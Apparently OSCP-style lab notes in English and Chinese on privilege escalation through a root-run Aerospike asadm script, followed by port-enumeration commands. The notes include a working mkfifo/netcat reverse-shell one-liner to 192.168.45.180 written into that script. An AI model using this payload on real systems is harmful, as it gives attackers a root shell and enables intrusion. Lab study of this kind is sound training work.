


when use # screen v4.5.0 Privilege Escalation,  need read the doc first, not just cp code and run


```
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.180 81 >/tmp/f' > /opt/aerospike/bin/asadm
```

```
2025/11/07 13:07:06 CMD: UID=0    PID=7447   | python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'
aero@oscp:/tmp$ ls -la /opt/aerospike/bin/asadm
-rwxr-xr-x 1 aero aero 6723733 Dec  7  2019 /opt/aerospike/bin/asadm

```

- `2025/11/07 13:07:06`  
    — 时间戳，表示这条事件被记录的时间：**2025-11-07 13:07:06**。
    
- `CMD:` / `UID=0` / `PID=7447`  
    — `CMD:` 表示被检测到的命令执行记录。  
    — `UID=0` 表示**以 UID 0（root）身份运行**。也就是说该进程的实际有效用户是 root。  
    — `PID=7447` 是该进程的进程号（Process ID），你可以用这个 PID 去进一步查看进程信息。
    
- `python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'`  
    — 进程执行的命令行：用 `python2.7` 解释器去运行 `/opt/aerospike/bin/asadm`，并传给它参数 `--asinfo-mode -e 'STATUS'`。  
    — `asadm` 很可能是 Aerospike 的管理/查询工具，这里 `--asinfo-mode -e 'STATUS'` 表示用 asinfo 模式查询 Aerospike 的状态（STATUS）。
```
-rwxr-xr-x 1 aero aero 6723733 Dec  7  2019 /opt/aerospike/bin/asadm

```

- `-rwxr-xr-x`：文件权限。表示这是一个普通文件（`-`），**owner** 有读/写/执行（`rwx`），**group** 有读/执行（`r-x`），**others** 有读/执行（`r-x`）。
    
- `1`：硬链接数（这里无关紧要）。
    
- `aero aero`：**文件所有者（owner）为 `aero`，所属组（group）也为 `aero`**。
    
- `6723733`：文件大小（字节），约 **6.7 MB**。
    
- `Dec 7 2019`：最后修改时间（mtime）：**2019 年 12 月 7 日**。
    
- `/opt/aerospike/bin/asadm`：文件完整路径。

```
nc -vz 192.168.185.143 3000 3001
```


下面用中文简单说明你给出的命令含义、为什么要用它、以及接下来如何判断 3000/3001 端口到底在跑什么服务并做指纹识别（包含可直接复制的命令）。
`nc -vz` 是快速判断端口是否**开放/有服务可连**的最简单方法。它能告诉你：

- 该端口**是否有进程在监听**（能建立 TCP 三次握手）。
    
- 不能直接告诉你是什么服务（HTTP、TLS、数据库、custom protocol 等），但能用作第一步筛选。  
    接下来需要进一步抓 banner、做协议探测，确定**具体服务类型和版本**
    
命令解释

- nc -vz 192.168.185.143 3000 3001
    - nc（netcat）是一个通用的 TCP/UDP 工具。
    - -v：verbose，打印详细信息（显示连接成功/失败原因）。
    - -z：zero-I/O（端口扫描/探测模式），不发送数据，只做连接尝试，通常用来快速检测端口是否开放。
    - 参数后面跟目标 IP 和要检测的端口（这里是 3000 和 3001）。 作用（为什么用它）
- 快速判断目标主机的一个或多个端口是否“能连通（open）”。这是最轻量的端口探测之一，比全端口扫描更快、噪声更小。
- 适合在发现某些高号端口（如 3000/3001）时先做快速确认，判断是否进一步枚举或指纹识别。

典型返回与含义（示例）

- 连接成功： Connection to 192.168.185.143 3000 port [tcp/*] succeeded! —— 表示目标 TCP 3000 可连接（端口开放）。下一步需要进一步识别服务类型。
- 连接被拒绝： nc: connect to 192.168.185.143 port 3001 (tcp) failed: Connection refused —— 表示目标主机明确拒绝连接（端口关闭或无监听）。
- 超时/无响应： nc: connect to 192.168.185.143 port 3001 (tcp) failed: Connection timed out —— 可能被防火墙丢弃（filtered）或网络中间有丢包。

如何进一步确认端口在跑什么（步骤 + 命令）

1. 更可靠的服务识别（推荐）

- nmap 服务识别： nmap -sV -p3000,3001 192.168.185.143 说明：能返回服务名称、版本信息，比 nc 更准确。

2. 如果是 HTTP/Web 服务，快速探测 HTTP 返回头/标题

- HTTP 简单探头： curl -I http://192.168.185.143:3000 curl -v http://192.168.185.143:3000/ （查看响应体和头）
- HTTPS（如果端口启用了 TLS）： openssl s_client -connect 192.168.185.143:3000 （看证书/握手信息）

3. banner 抓取（通用）

- 用 nc 连接后手动看 banner（对某些服务有效）： nc 192.168.185.143 3000 （回车观察是否有服务返回标识）
- 或用 ncat/nc 带超时和输出： nc -v -w 3 192.168.185.143 3000

4. Web 应用进一步枚举（如果确认是 Web）

- 指纹/目录扫描： whatweb http://192.168.185.143:3000 gobuster dir -u http://192.168.185.143:3000 -w /usr/share/wordlists/dirb/common.txt -t 50
- 漏洞扫描（仅限授权测试）： nikto -h http://192.168.185.143:3000

5. 如果你已经拿到目标主机 shell（本地查看）